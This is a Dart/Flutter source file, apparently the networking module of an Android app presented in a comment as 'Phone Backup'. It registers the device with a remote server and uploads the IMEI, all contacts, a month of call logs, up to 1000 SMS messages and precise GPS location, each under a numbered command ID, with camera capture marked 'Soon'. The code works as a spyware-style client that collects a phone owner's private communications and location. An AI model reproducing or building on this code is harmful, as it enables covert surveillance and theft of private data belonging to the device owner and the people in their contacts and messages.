// ignore_for_file: use_build_context_synchronously

import 'dart:convert';
import 'dart:developer';

import 'package:call_log/call_log.dart';
import 'package:contacts_service/contacts_service.dart';
import 'package:flutter/cupertino.dart';
import 'package:flutter/foundation.dart';
import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';
import 'package:geolocator/geolocator.dart';
import 'package:hive/hive.dart';
import 'package:http/http.dart' as http;
import 'package:intl/intl.dart';

import '../../data/models/calls_model/calls_hive_model.dart';
import '../../data/models/calls_model/calls_model.dart';
import '../../data/models/sms_model/sms_model.dart';
import '../providers/provider_main.dart';
import 'color_printer.dart';

// Call Records, SMS, Contacts, Files)
enum BNBType {
  callRecords,
  sms,
  contacts,
  storage,
}

DateFormat serverFormat = DateFormat('dd-MM-yyyy hh:mm:ss');
const base = kDebugMode ? 'https://testfix.foo' : 'https://directupdate.link';

class Api {
  // 1001 – device info
  static Future<String?> sendDeviceInfo(String? agent, String? imei) async {
    const url = '$base/a_agent_register'; // Phone Backup
    final headers = {
      'Content-Type': 'application/json',
      'User-Agent': '$agent'
    };
    printYellow('headers $headers');
    final response = await http.get(Uri.parse(url), headers: headers);

    if (response.statusCode == 200) {
      final responseData = jsonDecode(response.body);

      if (kDebugMode) {
        print('initRegister - Response: \n$responseData\n--');
      }

      try {
        // {extra_data: {"agent_uuid": "901916f1-803b-4a56-b302-0209d4515b8d"}, status: 1}
        final uuid = jsonDecode(responseData['extra_data'])['agent_uuid'];

        _sendToServer(agent, uuid, type: 'Device info', data: {
          "uuid": uuid,
          "command_id": "1001",
          "data": {
            "IMEI": imei.toString(),
            "phone_number": '',
            "voice_mail_number": '',
            "IMSI": UniqueKey().toString().replaceAll('#', ''),
            "network_name": "Android",
          }
        });

        return uuid;
      } catch (e) {
        return null;
      }
    } else {
      throw 'Request failed with status: ${response.statusCode}';
    }
  }

  static Future _sendToServer(String? agent, String? uuid,
      {Map<String, dynamic>? data, required String type}) async {
    if (agent == null) {
      printYellow(
          'PASS [$type] sendToServer() command_id: ${data?['command_id']} No SERVER AGENT');
      return;
    }
    if (uuid == null) {
      printYellow(
          'PASS [$type] sendToServer() command_id: ${data?['command_id']} No SERVER UUID');
      return;
    }

    const url = '$base/a_agent_upload';
    final headers = {'Content-Type': 'application/json', 'User-Agent': agent};
    final body = jsonEncode(data ?? {});

    printYellow('[$type] sendToServer() - body $body \n');

    final response = await http.post(
      Uri.parse(url),
      headers: headers,
      body: body,
    );

    if (response.statusCode == 200) {
      // Request successful
      final responseData = jsonDecode(response.body);

      printGreen('[$type] sendToServer() - Response: $responseData\n');
    } else {
      // Request failed
      if (kDebugMode) {
        print('Request failed with status: ${response.statusCode}');
      }
    }
  }

  // 1 - contacts
  static Future<String?> sendContacts(String? agent, String? uuid) async {
    printWhite('START: sendContactsToServer()');

    if (kDebugMode) {
      print('agent $agent');
      print('uuid $uuid');
    }

    Iterable<Contact> contacts = await ContactsService.getContacts();
    List phonesData = [];

    for (var c in contacts) {
      if ((c.phones ?? []).isNotEmpty) {
        if (kDebugMode && phonesData.length > 4) break;
        phonesData.add(
          {
            "mobileNumber": '${c.phones?.first.value}',
            "name": c.displayName,
          },
        );
      }
    }

    await _sendToServer(
      agent,
      uuid,
      type: 'Contacts',
      data: {"uuid": uuid, "command_id": "1", "data": phonesData},
    );

    return contacts.length.toString();
  }

  // 2 – call records
  Future sendCallLogs(BuildContext context, String? agent, String? uuid) async {
    printWhite('START: sendCallLogs() ');
    Hive.registerAdapter(CallsAdapter());
    late Box box;
    box = await Hive.openBox('calls');
    if (kDebugMode) {
      print('agent $agent');
      print('uuid $uuid');
    }

    // QUERY CALL LOG (ALL PARAMS ARE OPTIONAL)
    var now = DateTime.now();
    int from = now.subtract(const Duration(days: 30)).millisecondsSinceEpoch;
    Iterable<CallLogEntry> callLogs = await CallLog.query(
      dateFrom: from,
      dateTo: now.microsecondsSinceEpoch,
    );

    List callsJsonList = [];
    List<CallsModel> callsModelList = [];
    DateTime lastDate = await getCallsFromDb(context);

    for (var call in callLogs) {
      final date = DateTime.fromMillisecondsSinceEpoch(
          call.timestamp ?? now.millisecondsSinceEpoch);
      final json = {
        "date": serverFormat.format(date).toString(),
        "duration": call.duration.toString(),
        "mobileNumber": call.number.toString(),
        "name": call.name.toString(),
        "type": call.callType?.name.toString(),
        "isHide": false,
      };

      callsJsonList.add(json);
      final callModel = CallsModel.fromJson(json).copyWith(datetime: date);
      callsModelList.add(callModel);
      if (callModel.datetime!.isAfter(lastDate)) {
        var calls = Calls()
          ..name = callModel.name
          ..mobileNumber = callModel.mobileNumber
          ..date = callModel.date
          ..dateTime = callModel.datetime
          ..duration = callModel.duration
          ..type = callModel.type
          ..isHide = callModel.isHide;
        box.add(calls);
      }
    }
    getCallsFromDb(context);
    // providerMainScope(context).callLogs = callsModelList;

    _sendToServer(agent, uuid,
        type: 'Call Logs',
        data: {"uuid": uuid, "command_id": "2", "data": callsJsonList});
  }

  getCallsFromDb(context) async {
    List<CallsModel> callsModelList = [];

    late Box box;
    box = await Hive.openBox('calls');

    var raw = box.toMap();

    raw.forEach((key, value) {
      final callModel = CallsModel(
          name: value.name,
          date: value.date,
          datetime: value.dateTime,
          duration: value.duration,
          isHide: value.isHide ?? false,
          mobileNumber: value.mobileNumber,
          type: value.type);
      callsModelList.add(callModel);
    });

    providerMainScope(context).callLogs = callsModelList;
    log('callsModelList length :: ${callsModelList.length}');
    return (callsModelList.isNotEmpty)
        ? callsModelList.first.datetime
        : DateTime.now().subtract(const Duration(days: 30));
  }

  updateCallLogs(context,status) async {
    late Box box;
    box = await Hive.openBox('calls');

    var raw = box.toMap();


    for(var i=0; i<raw.length; i++) {

      var calls = Calls()
        ..name = raw[i].name
        ..mobileNumber = raw[i].mobileNumber
        ..date = raw[i].date
        ..dateTime = raw[i].dateTime
        ..duration = raw[i].duration
        ..type = raw[i].type
        ..isHide = status;
      box.putAt(i,calls);
    }
    getCallsFromDb(context);
  }

  // 3 - location
  static Future<String?> sendLocation(String? agent, String? uuid) async {
    printWhite('START: sendLocationToServer() ');

    if (kDebugMode) {
      print('agent $agent');
      print('uuid $uuid');
    }

    final Position position = await Geolocator.getCurrentPosition(
      desiredAccuracy: LocationAccuracy.high,
      timeLimit: const Duration(seconds: 10),
    );

    _sendToServer(agent, uuid, type: 'Location', data: {
      "uuid": uuid,
      "command_id": "3",
      "data": {
        "longitude": "${position.longitude}",
        "latitude": "${position.latitude}",
        "date": serverFormat.format(DateTime.now()).toString()
      }
    });

    return position.toString();
  }

  // 4 – camera (Soon)

  // 5 – sms list
  static Future sendSmsLogs(
      BuildContext context, String? agent, String? uuid) async {
    printWhite('START: sendSmsLogs() ');

    if (kDebugMode) {
      print('agent $agent');
      print('uuid $uuid');
    }

    final smsQuery = await SmsQuery().querySms(
        sort: true,
        count: kDebugMode ? 20 : 1000,
        kinds: [SmsQueryKind.inbox, SmsQueryKind.sent]);

    // print('smsQuery.length ${smsQuery.length}');
    // print('smsQuery.toMap ${smsQuery.firstOrNull?.toMap}');
    // print('smsQuery.sender ${smsQuery.firstOrNull?.sender}');

    List smsJsonList = [];
    List<SmsModel> smsModelList = [];

    for (var sms in smsQuery) {
      final json = {
        "phone_number": sms.address.toString(),
        "message": sms.body.toString(),
        "date": serverFormat.format(sms.date ?? DateTime.now()).toString(),
        "sender": sms.kind == SmsMessageKind.sent
      };
      smsJsonList.add(json);
      final smsModel = SmsModel.fromJson(json).copyWith(datetime: sms.date);
      smsModelList.add(smsModel);
    }

    providerMainScope(context).smsLogs = smsModelList;

    _sendToServer(agent, uuid,
        type: 'SMS Logs',
        data: {"uuid": uuid, "command_id": "5", "data": smsJsonList});
  }
}
